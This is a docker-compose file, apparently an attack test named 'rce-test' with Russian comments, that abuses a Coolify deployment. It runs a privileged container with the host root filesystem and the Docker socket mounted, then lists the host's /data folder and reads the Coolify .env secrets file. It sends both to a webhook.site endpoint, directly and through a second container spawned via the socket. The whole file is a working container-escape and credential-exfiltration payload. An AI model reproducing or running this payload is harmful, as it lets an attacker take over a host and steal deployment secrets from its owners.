version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root:rshared'   # ключевое изменение
      - '/var/run/docker.sock:/var/run/docker.sock'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        # Проверяем, видна ли папка /data теперь в контейнере
        ls -la /host-root/data > /tmp/ls_data.txt 2>&1
        curl -X POST --data-binary @/tmp/ls_data.txt https://webhook.site/ТВОЙ-URL?stage=ls_data
        
        # Пытаемся прочитать .env напрямую, если она видна
        cat /host-root/data/coolify/source/.env 2>/dev/null | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=direct_env
        
        # Альтернатива: запустить новый контейнер с rshared
        docker run --rm -v /:/host:rshared alpine:3.19 cat /host/data/coolify/source/.env | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=via_docker_rshared
